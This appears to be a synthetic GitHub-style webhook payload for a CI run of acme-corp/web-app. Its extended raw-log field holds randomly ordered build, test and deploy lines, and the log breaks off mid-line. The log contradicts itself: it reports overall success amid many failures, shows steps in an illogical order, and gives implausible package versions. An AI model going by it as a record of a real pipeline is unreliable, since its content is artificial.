{
  "action": "completed",
  "workflow_run": {
    "id": 178,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-513",
    "head_sha": "aa97e11367fba3b933502c6c932150bd0046dbad",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-19T12:00:21.150303Z",
    "updated_at": "2025-12-19T12:03:20.009331Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nCache hit for key-7293\nCompiling src/service.java...\nCache hit for key-5449\nInstalling eslint@1.12.0\nCache hit for key-7573\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (34MB)\nStep 1/10: Building\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 build completed\n  PASS: test_db_connect (179ms)\nCompiling src/app.ts...\nInstalling lodash@5.5.0\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (419ms)\nException: ValueError\n[12:00:21] INFO: Processing request\nFAILED: test_db_connect\nCache hit for key-4391\nCompiling src/index.js...\nCache hit for key-5314\nStep 8/10: Building\nStep 6/10: Building\nInstalling eslint@4.18.0\n[12:00:21] INFO: Processing request\nInstalling jest@5.19.0\nCompiling src/service.java...\nCache hit for key-8471\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-5165\nCompiling src/service.java...\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 build completed\nInstalling axios@1.7.0\nWARNING: react has known vulnerabilities\nException: RuntimeError\nInstalling react@1.13.0\nStep 5/10: Building\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_user_create (222ms)\n  PASS: test_cache_hit (57ms)\nInstalling express@2.16.0\nCache hit for key-3885\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-4264\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_cache_hit (424ms)\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nInstalling express@1.18.0\n\u2713 build completed\n\u2713 build completed\n\u2713 test completed\nCache hit for key-8078\n  PASS: test_user_create (6ms)\nCache hit for key-8192\nStep 3/10: Building\n[12:00:21] INFO: Processing request\nInstalling jest@5.0.0\n[12:00:21] INFO: Processing request\nStep 4/10: Building\nCache hit for key-5706\n  PASS: test_db_connect (414ms)\n[12:00:21] WARN: Deprecated API usage\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (286ms)\nCache hit for key-5478\n[12:00:21] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (297ms)\nCache hit for key-3708\nInstalling axios@1.20.0\nCompiling src/service.java...\n  PASS: test_api_health (193ms)\n[12:00:21] INFO: Processing request\n  PASS: test_auth_login (455ms)\nInstalling jest@1.13.0\nInstalling axios@4.18.0\nInstalling react@2.18.0\nStep 1/10: Building\nCache hit for key-7894\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\nInstalling lodash@1.15.0\nCompiling src/index.js...\nCompiling src/main.py...\nStep 8/10: Building\nInstalling webpack@3.8.0\nCache hit for key-4132\n[12:00:21] INFO: Processing request\nInstalling lodash@3.15.0\nFAILED: test_cache_hit\nCache hit for key-8725\nWARNING: lodash has known vulnerabilities\nStep 1/10: Building\nCache hit for key-4371\nCache hit for key-7429\n[12:00:21] INFO: Processing request\nCache hit for key-9823\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_api_health (358ms)\nCache hit for key-3652\nCache hit for key-8462\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 build completed\n\u2713 build completed\n  PASS: test_api_health (121ms)\n\u2713 build completed\n[12:00:21] INFO: Processing request\n=== Step deploy_staging completed ===\n=== Step: build ===\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nCompiling src/utils.go...\n  PASS: test_api_health (147ms)\nInstalling axios@4.2.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_db_connect (281ms)\nArtifact uploaded: build.tar.gz (47MB)\nInstalling eslint@3.5.0\nCompiling src/handler.rs...\nCache hit for key-3215\n[12:00:21] INFO: Processing request\n\u2713 build completed\n\u2717 build failed with exit code 116\nStep 5/10: Building\nCompiling src/handler.rs...\n  PASS: test_api_health (451ms)\nStep 1/10: Building\n\u2713 build completed\nStep 1/10: Building\nInstalling eslint@2.2.0\nCache hit for key-9828\n[12:00:21] INFO: Processing request\nInstalling jest@4.19.0\nArtifact uploaded: build.tar.gz (35MB)\nInstalling express@3.8.0\nCache hit for key-3870\nStep 8/10: Building\nInstalling express@2.9.0\nCompiling src/service.java...\nInstalling jest@3.11.0\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:21] INFO: Processing request\nCache hit for key-7241\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-9123\n[12:00:21] INFO: Processing request\nInstalling axios@4.17.0\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/handler.rs...\nCache hit for key-5933\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:21] INFO: Processing request\nStep 9/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (20MB)\nStep 8/10: Building\nCache hit for key-4406\nCompiling src/app.ts...\nStep 1/10: Building\nCache hit for key-8740\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/utils.go...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-6307\n\u2713 build completed\n[12:00:21] ERROR: Connection failed\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/main.py...\nInstalling jest@1.9.0\nCache hit for key-9531\n  PASS: test_cache_hit (268ms)\n  PASS: test_auth_login (121ms)\nStep 4/10: Building\nWARNING: eslint has known vulnerabilities\nInstalling eslint@4.12.0\nCache hit for key-1082\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (113ms)\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:21] INFO: Processing request\n[12:00:21] ERROR: Connection failed\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 build completed\nInstalling lodash@3.10.0\nArtifact uploaded: build.tar.gz (36MB)\nInstalling lodash@3.19.0\nInstalling express@4.8.0\n  PASS: test_auth_login (259ms)\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (50MB)\nInstalling lodash@3.8.0\nStep 9/10: Building\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\nCache hit for key-5805\nCache hit for key-6393\nStep 3/10: Building\n[12:00:21] INFO: Processing request\n\u2713 test completed\nCache hit for key-5928\nArtifact uploaded: build.tar.gz (23MB)\n=== Step build completed ===\n=== Step: unit_tests ===\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 lint completed\n[12:00:21] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (54ms)\n  PASS: test_user_create (126ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\nStep 8/10: Building\n\u2713 build completed\n\u2713 test completed\nInstalling lodash@1.9.0\nInstalling react@1.1.0\nCache hit for key-7195\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:21] INFO: Processing request\nStep 1/10: Building\nStep 7/10: Building\n  PASS: test_cache_hit (212ms)\nStep 1/10: Building\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (22ms)\n  PASS: test_auth_login (136ms)\n  PASS: test_user_create (271ms)\nCompiling src/handler.rs...\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (15ms)\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-5338\nInstalling axios@5.9.0\nArtifact uploaded: build.tar.gz (34MB)\nStep 5/10: Building\nStep 7/10: Building\n  PASS: test_db_connect (385ms)\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (144ms)\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:21] INFO: Processing request\nCache hit for key-4543\n[12:00:21] INFO: Processing request\n  PASS: test_auth_login (496ms)\nInstalling axios@1.12.0\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_cache_hit (16ms)\n  PASS: test_auth_login (376ms)\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (35MB)\nFAILED: test_api_health\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (46MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (40MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:21] WARN: Deprecated API usage\nInstalling eslint@4.13.0\nCache hit for key-5896\nCache hit for key-3257\nArtifact uploaded: build.tar.gz (5MB)\nStep 6/10: Building\nStep 5/10: Building\nCache hit for key-6774\n  PASS: test_user_create (404ms)\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (158ms)\nCache hit for key-7697\nCache hit for key-6234\nCompiling src/service.java...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (35MB)\nStep 2/10: Building\n\u2713 lint completed\n\u2713 build completed\nStep 7/10: Building\nInstalling lodash@5.13.0\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:21] WARN: Deprecated API usage\n  PASS: test_api_health (493ms)\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-3307\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nWARNING: lodash has known vulnerabilities\nStep 6/10: Building\nCache hit for key-8889\n  PASS: test_api_health (83ms)\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-8662\nWARNING: eslint has known vulnerabilities\nInstalling express@1.13.0\n\u2713 test completed\nStep 1/10: Building\n[12:00:21] INFO: Processing request\nCache hit for key-5261\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (1MB)\nStep 6/10: Building\nCompiling src/index.js...\n\u2713 lint completed\n  PASS: test_api_health (298ms)\n[12:00:21] INFO: Processing request\n=== Step unit_tests completed ===\n=== Step: type_check ===\nInstalling jest@3.16.0\n  PASS: test_cache_hit (455ms)\nCache hit for key-9705\n[12:00:21] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nCache hit for key-3737\n\u2713 lint completed\nException: TypeError\n\u2713 test completed\n[12:00:21] INFO: Processing request\nInstalling prettier@1.15.0\nInstalling express@1.3.0\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/handler.rs...\n  PASS: test_api_health (374ms)\nStep 2/10: Building\n[12:00:21] INFO: Processing request\nCompiling src/utils.go...\nInstalling jest@1.6.0\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 6/10: Building\n  PASS: test_cache_hit (228ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (362ms)\nCache hit for key-5241\nCache hit for key-8751\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (29MB)\nStep 2/10: Building\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/app.ts...\nCache hit for key-3038\nInstalling webpack@5.8.0\nStep 2/10: Building\nCache hit for key-3185\nCompiling src/index.js...\n\u2717 build failed with exit code 104\nCache hit for key-3709\n  PASS: test_user_create (338ms)\nInstalling react@4.6.0\nInstalling webpack@5.9.0\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nStep 8/10: Building\nStep 9/10: Building\nInstalling jest@5.3.0\n  PASS: test_auth_login (232ms)\nCache hit for key-8121\n  PASS: test_user_create (274ms)\nInstalling axios@3.15.0\nInstalling eslint@3.1.0\n  PASS: test_auth_login (23ms)\nCache hit for key-3517\nCache hit for key-2291\nInstalling express@2.6.0\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/index.js...\nStep 7/10: Building\n  PASS: test_auth_login (276ms)\n  PASS: test_auth_login (104ms)\n\u2713 test completed\n  PASS: test_api_health (454ms)\nCompiling src/index.js...\nInstalling express@3.4.0\nCache hit for key-6978\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCache hit for key-8035\nCache hit for key-2908\n[12:00:21] INFO: Processing request\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-5680\nInstalling express@2.15.0\nInstalling eslint@3.15.0\nCache hit for key-2864\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-4799\nStep 7/10: Building\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_auth_login (381ms)\n[12:00:21] INFO: Processing request\nInstalling lodash@1.15.0\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-1935\nCache hit for key-3402\nCache hit for key-2537\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9775\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:21] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/utils.go...\n[12:00:21] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 test completed\nWARNING: express has known vulnerabilities\nInstalling axios@5.15.0\n  PASS: test_auth_login (115ms)\nStep 3/10: Building\n\u2713 lint completed\n\u2713 build completed\n\u2713 build completed\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nInstalling axios@5.12.0\n[12:00:21] INFO: Processing request\nCache hit for key-5167\nCompiling src/app.ts...\nInstalling jest@3.8.0\n  PASS: test_db_connect (138ms)\n  PASS: test_user_create (287ms)\n[12:00:21] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nInstalling axios@2.1.0\nInstalling express@4.8.0\n\u2713 build completed\nStep 6/10: Building\nInstalling lodash@5.5.0\n  PASS: test_cache_hit (324ms)\n[12:00:21] INFO: Processing request\n\u2713 test completed\n  PASS: test_user_create (245ms)\nStep 10/10: Building\n\u2713 lint completed\nInstalling axios@3.1.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nCache hit for key-6235\n  PASS: test_db_connect (125ms)\n  PASS: test_auth_login (83ms)\n  PASS: test_cache_hit (430ms)\n\u2717 build failed with exit code 99\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\nCompiling src/main.py...\nWARNING: express has known vulnerabilities\nCompiling src/app.ts...\n  PASS: test_db_connect (267ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:21] INFO: Processing request\n  PASS: test_auth_login (209ms)\nCompiling src/handler.rs...\n  PASS: test_auth_login (110ms)\n  PASS: test_db_connect (440ms)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (23MB)\nInstalling express@4.19.0\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-9349\nCache hit for key-6096\n[12:00:21] INFO: Processing request\nCompiling src/main.py...\nCompiling src/main.py...\nCache hit for key-6643\nCache hit for key-4444\nStep 9/10: Building\nCache hit for key-1320\nInstalling jest@5.19.0\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_cache_hit (461ms)\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:21] INFO: Processing request\nCompiling src/main.py...\n\u2713 build completed\nCompiling src/app.ts...\nInstalling lodash@1.3.0\nArtifact uploaded: build.tar.gz (49MB)\nStep 2/10: Building\nCache hit for key-1232\n\u2717 build failed with exit code 89\n  PASS: test_user_create (15ms)\nStep 9/10: Building\n  PASS: test_user_create (83ms)\nCache hit for key-4624\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\nCache hit for key-3114\nWARNING: webpack has known vulnerabilities\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nInstalling axios@2.17.0\nStep 9/10: Building\nCache hit for key-8454\nCache hit for key-5366\n  PASS: test_cache_hit (120ms)\nInstalling axios@4.14.0\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: test_user_create (105ms)\nArtifact uploaded: build.tar.gz (25MB)\nStep 4/10: Building\nCache hit for key-2191\n  PASS: test_db_connect (50ms)\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_auth_login (71ms)\nCache hit for key-3473\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (16MB)\nFAILED: test_user_create\nFAILED: test_db_connect\nInstalling express@3.6.0\n\u2713 test completed\nCache hit for key-9999\nCache hit for key-6848\nInstalling prettier@2.15.0\nCache hit for key-7184\nCache hit for key-4831\nCompiling src/handler.rs...\nCache hit for key-3256\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\n\u2713 lint completed\nCache hit for key-6787\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_api_health (71ms)\nCache hit for key-8603\nCache hit for key-6552\nArtifact uploaded: build.tar.gz (41MB)\nStep 1/10: Building\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nCache hit for key-7628\nCompiling src/handler.rs...\n  PASS: test_cache_hit (438ms)\nCompiling src/utils.go...\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nCache hit for key-5411\n[12:00:21] ERROR: Connection failed\nCompiling src/handler.rs...\nStep 4/10: Building\nCache hit for key-9397\nCache hit for key-4789\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: jest has known vulnerabilities\n[12:00:21] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (19MB)\nStep 2/10: Building\nInstalling axios@5.20.0\n  PASS: test_user_create (491ms)\nStep 7/10: Building\n\u2713 test completed\n\u2713 test completed\nInstalling eslint@1.14.0\nStep 10/10: Building\nStep 4/10: Building\nCache hit for key-8569\nInstalling eslint@3.2.0\nCache hit for key-7397\nInstalling eslint@2.20.0\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-4460\nStep 8/10: Building\n  PASS: test_db_connect (62ms)\nCache hit for key-8942\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (10MB)\nInstalling eslint@5.12.0\nCompiling src/handler.rs...\nStep 8/10: Building\n\u2713 test completed\nCache hit for key-6046\nStep 8/10: Building\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nInstalling prettier@2.6.0\n\u2713 lint completed\nStep 1/10: Building\n\u2713 build completed\nStep 3/10: Building\n[12:00:21] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (42MB)\nInstalling jest@1.20.0\nInstalling lodash@4.13.0\n\u2713 test completed\n  PASS: test_api_health (139ms)\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nInstalling react@1.13.0\n\u2713 lint completed\n  PASS: test_api_health (185ms)\n\u2713 lint completed\n  PASS: test_auth_login (335ms)\n\u2713 build completed\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (24MB)\nInstalling jest@1.15.0\n  PASS: test_user_create (348ms)\n[12:00:21] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-7982\nInstalling axios@3.6.0\nArtifact uploaded: build.tar.gz (35MB)\nStep 8/10: Building\nCache hit for key-8852\nCompiling src/app.ts...\nCache hit for key-6453\nCompiling src/service.java...\nCompiling src/utils.go...\nCache hit for key-6159\n\u2713 test completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\n\u2713 lint completed\nInstalling axios@4.19.0\n\u2713 lint completed\nCache hit for key-7779\nCache hit for key-6092\n  PASS: test_user_create (170ms)\nCache hit for key-6891\n  PASS: test_db_connect (287ms)\n[12:00:21] INFO: Processing request\nStep 5/10: Building\n  PASS: test_auth_login (82ms)\nCompiling src/index.js...\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\nWARNING: eslint has known vulnerabilities\nStep 10/10: Building\nCache hit for key-4261\n\u2713 test completed\nStep 5/10: Building\nStep 9/10: Building\nCache hit for key-9849\n\u2713 test completed\nStep 6/10: Building\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/index.js...\n[12:00:21] INFO: Processing request\nCache hit for key-5035\nCache hit for key-2000\nCache hit for key-1663\n\u2713 build completed\nInstalling eslint@1.15.0\nCompiling src/handler.rs...\nException: NullPointerException\nCompiling src/main.py...\nCompiling src/index.js...\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (300ms)\nCache hit for key-2878\nCompiling src/index.js...\nInstalling react@2.13.0\n  PASS: test_db_connect (286ms)\n  PASS: test_api_health (21ms)\nStep 8/10: Building\nCompiling src/service.java...\nCache hit for key-3214\nInstalling axios@3.0.0\n  PASS: test_cache_hit (217ms)\nStep 1/10: Building\nStep 8/10: Building\nInstalling webpack@1.14.0\n\u2713 lint completed\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-4606\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_db_connect (3ms)\nCache hit for key-2432\nCompiling src/handler.rs...\nWARNING: webpack has known vulnerabilities\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nInstalling jest@4.14.0\nStep 4/10: Building\n\u2713 build completed\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nStep 1/10: Building\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-8866\nCache hit for key-7800\n\u2713 lint completed\nCache hit for key-8649\nCache hit for key-8404\nCompiling src/main.py...\nStep 6/10: Building\nStep 9/10: Building\nCompiling src/handler.rs...\nCache hit for key-1065\nCache hit for key-3579\nCompiling src/index.js...\n\u2713 test completed\nCompiling src/index.js...\n  PASS: test_auth_login (167ms)\nCompiling src/index.js...\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n\u2713 lint completed\nInstalling eslint@4.9.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/service.java...\nCompiling src/utils.go...\nWARNING: webpack has known vulnerabilities\nInstalling axios@3.3.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-6378\nCompiling src/app.ts...\n\u2713 test completed\n  PASS: test_cache_hit (356ms)\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nStep 3/10: Building\nStep 1/10: Building\nCache hit for key-3674\nCache hit for key-6341\nStep 10/10: Building\nCompiling src/utils.go...\n  PASS: test_user_create (489ms)\nWARNING: prettier has known vulnerabilities\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: lodash has known vulnerabilities\n  PASS: test_user_create (11ms)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling axios@4.5.0\nWARNING: axios has known vulnerabilities\nInstalling prettier@1.16.0\n[12:00:21] INFO: Processing request\n  PASS: test_auth_login (145ms)\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\nStep 9/10: Building\n  PASS: test_cache_hit (140ms)\n\u2713 test completed\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:21] INFO: Processing request\nInstalling webpack@3.8.0\n  PASS: test_user_create (22ms)\nStep 2/10: Building\nStep 1/10: Building\n  PASS: test_cache_hit (124ms)\nStep 5/10: Building\nCompiling src/handler.rs...\nInstalling jest@4.7.0\nCache hit for key-6354\n  PASS: test_user_create (461ms)\n\u2713 test completed\nStep 6/10: Building\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\nWARNING: webpack has known vulnerabilities\nCompiling src/handler.rs...\nInstalling webpack@5.15.0\n\u2717 build failed with exit code 119\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 build completed\nCompiling src/utils.go...\nInstalling jest@5.18.0\n\u2713 lint completed\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-8309\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\nStep 4/10: Building\n\u2713 build completed\n\u2713 test completed\nStep 7/10: Building\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nInstalling express@3.17.0\nCache hit for key-1372\nStep 9/10: Building\n  PASS: test_cache_hit (13ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n  PASS: test_db_connect (241ms)\n  PASS: test_db_connect (434ms)\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-9638\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCompiling src/utils.go...\nInstalling eslint@2.18.0\nCompiling src/app.ts...\nInstalling prettier@3.16.0\nCache hit for key-4540\nCache hit for key-2646\nStep 1/10: Building\n\u2713 test completed\n  PASS: test_user_create (286ms)\n  PASS: test_auth_login (153ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (480ms)\nStep 7/10: Building\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_cache_hit (17ms)\nCache hit for key-2693\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (30MB)\nInstalling react@4.7.0\nInstalling react@3.6.0\n  PASS: test_db_connect (426ms)\nCompiling src/app.ts...\nStep 4/10: Building\nInstalling jest@1.7.0\nCompiling src/utils.go...\nStep 5/10: Building\n\u2713 build completed\nCompiling src/index.js...\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (362ms)\nCache hit for key-4172\n  PASS: test_cache_hit (3ms)\nCache hit for key-9388\nCache hit for key-5487\nCache hit for key-3732\n[12:00:21] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (43ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (18MB)\nWARNING: lodash has known vulnerabilities\n[12:00:21] WARN: Deprecated API usage\nStep 5/10: Building\nCache hit for key-6267\n\u2713 test completed\n\u2713 lint completed\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 3/10: Building\n  PASS: test_user_create (46ms)\n[12:00:21] INFO: Processing request\nCache hit for key-9761\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\n  PASS: test_db_connect (245ms)\n[12:00:21] INFO: Processing request\nCache hit for key-1545\nStep 1/10: Building\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (338ms)\n  PASS: test_db_connect (79ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (12MB)\nStep 6/10: Building\nInstalling axios@4.1.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_auth_login (476ms)\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:21] WARN: Deprecated API usage\n\u2713 lint completed\nStep 3/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 lint completed\n  PASS: test_cache_hit (157ms)\n\u2713 lint completed\n  PASS: test_api_health (487ms)\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: webpack has known vulnerabilities\nStep 10/10: Building\nStep 8/10: Building\nCache hit for key-1655\n[12:00:21] WARN: Deprecated API usage\nCompiling src/main.py...\nCache hit for key-9003\nArtifact uploaded: build.tar.gz (44MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nInstalling eslint@2.12.0\nStep 5/10: Building\n  PASS: test_cache_hit (308ms)\n\u2713 test completed\n\u2717 build failed with exit code 34\nCache hit for key-8571\n  PASS: test_auth_login (459ms)\n[12:00:21] WARN: Deprecated API usage\nCompiling src/handler.rs...\n\u2713 lint completed\nCache hit for key-4100\n  PASS: test_cache_hit (290ms)\nInstalling axios@2.16.0\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/utils.go...\nInstalling prettier@1.13.0\nInstalling express@1.5.0\nStep 3/10: Building\nCache hit for key-9696\nInstalling lodash@5.8.0\nWARNING: lodash has known 